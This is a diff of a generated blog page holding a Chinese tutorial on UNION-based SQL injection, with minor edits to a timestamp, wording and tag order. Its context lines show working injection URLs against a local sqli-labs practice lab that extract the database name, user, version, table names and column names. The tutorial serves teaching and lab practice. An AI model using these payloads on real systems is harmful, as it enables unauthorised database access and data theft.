@@ -22,7 +22,7 @@
 <meta property="og:image" content="http://yoursite.com/img/sql/5.png">
 <meta property="og:image" content="http://yoursite.com/img/sql/6.png">
 <meta property="og:image" content="http://yoursite.com/img/sql/7.png">
-<meta property="og:updated_time" content="2018-01-06T22:04:56.193Z">
+<meta property="og:updated_time" content="2018-01-06T22:12:15.721Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL injection（联合查询）">
 <meta name="twitter:description" content="前天发那个微信js跳转支付宝的一夜就黄了！寻思想写点啥东西？想了很久都没想到。最后决定还是记录下sql注入的基础，还有怎么针对sql注入漏洞来编写python脚本吧  sql注入的分类1.UNION query SQL injection（联合查询注入）2.Error-based SQL injection（报错型注入）3.Boolean-based blind SQL injection（布">
@@ -183,7 +183,7 @@
 <blockquote>
 <p>前天发那个微信js跳转支付宝的一夜就黄了！寻思想写点啥东西？想了很久都没想到。<br>最后决定还是记录下sql注入的基础，还有怎么针对sql注入漏洞来编写python脚本吧</p>
 </blockquote>
-<h2 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h2><p><strong>1.UNION query SQL injection（联合查询注入）<br>2.Error-based SQL injection（报错型注入）<br>3.Boolean-based blind SQL injection（布尔型注入）<br>4.Time-based blind SQL injection（基于时间延迟注入）<br>5.Stacked queries SQL injection（多语句查询注入）</strong></p>
+<h2 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h2><p><strong>1.UNION query SQL injection（联合查询注入）<br>2.Error-based SQL injection（报错型注入）<br>3.Boolean-based blind SQL injection（布尔型注入）<br>4.Time-based blind SQL injection（基于时间延迟注入）<br>5.Stacked queries SQL injection（多语句查询注入）</strong><br><a id="more"></a></p>
 <h2 id="UNION-query-SQL-injection（联合查询注入）"><a href="#UNION-query-SQL-injection（联合查询注入）" class="headerlink" title="UNION query SQL injection（联合查询注入）"></a>UNION query SQL injection（联合查询注入）</h2><p>联合查询在sql注入里面是最快获取数据的方法<br>通过UNION来执行注入的sql语句，前提是请求返回后能输出SQL执行后查询到的所有内容</p>
 <p><strong>步骤：</strong><br>1.检测字段数<br>2.获取数据库基本信息<br>3.获取数据库所有的表<br>4.获取表的字段<br>5.获取表的内容</p>
 <h2 id="知识扫盲"><a href="#知识扫盲" class="headerlink" title="知识扫盲"></a>知识扫盲</h2><p><strong>user() <code>用户函数</code><br>database() <code>数据库函数</code><br>version() <code>版本号函数</code><br>information_schema<code>mysql自带的库，这个库保存了mysql服务器所有的信息</code><br>information_schema.schemata <code>含有所有数据库名的表</code><br>information_schema.tables <code>含有所有表名的表</code><br>information_schema.columns <code>含有所有列的表</code><br>concat_ws()<code>函数,字符串处理函数</code><br>char()<code>函数字符串函数</code><br>concat_ws()主要是处理char()函数，CHAR(32,58,32)解析出来就是<code>空格:空格</code>
@@ -193,7 +193,7 @@
 <h2 id="查询数据库基本信息"><a href="#查询数据库基本信息" class="headerlink" title="查询数据库基本信息"></a>查询数据库基本信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">' union select 1,concat_ws(char(32,58,32),database(),user(),version()),3 -- +</span></span><br></pre></td></tr></table></figure>
 <p><img src="/img/sql/3.png" alt="“sql3”"></p>
 <h2 id="查询表信息"><a href="#查询表信息" class="headerlink" title="查询表信息"></a>查询表信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">' union select 1,table_name,3 from information_schema.tables where table_schema=database() -- +</span></span><br></pre></td></tr></table></figure>
-<p><img src="/img/sql/4.png" alt="“sql4”"><br><strong>这里只显示了一个表怎么肥事咧？猜测应该是用了<code>limit</code>语句<br>我们可以在语句后面加上<code>limit</code>语句依次将所有的表列出来<br>不过这样太麻烦了，我们这时候用到<code>group_concat()</code>函数，讲他们一次全导出来 </strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">' union select 1,group_concat(char(32),table_name,char(32)),3 from information_schema.tables where table_schema=database() -- +</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/sql/4.png" alt="“sql4”"><br><strong>这里只显示了一个表怎么肥事咧？猜测应该是用了<code>limit</code>语句<br>我们可以在语句后面加上<code>limit</code>语句依次将所有的表列出来<br>不过这样太麻烦了，我们这时候用到<code>group_concat()</code>函数，让它们一次全导出来 </strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">' union select 1,group_concat(char(32),table_name,char(32)),3 from information_schema.tables where table_schema=database() -- +</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="/img/sql/5.png" alt="“sql5”"></p>
 <h2 id="查询列信息"><a href="#查询列信息" class="headerlink" title="查询列信息"></a>查询列信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1<span class="string">' union select 1,group_concat(char(32),column_name,char(32)),3 from information_schema.columns where table_name=0x7573657273 -- +</span></span><br></pre></td></tr></table></figure>
 <p><img src="/img/sql/6.png" alt="“sql6”"><br>注意，查询<code>information_schema</code>中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了，这对过滤单引号应该有指导意义。<br><code>users</code>的十六进制转换是：<code>0x7573657273</code></p>
@@ -435,7 +435,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color5">JS跳转</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -447,15 +447,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">JS跳转</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">kai</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">系统美化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
             
             <div class="clearfix"></div>
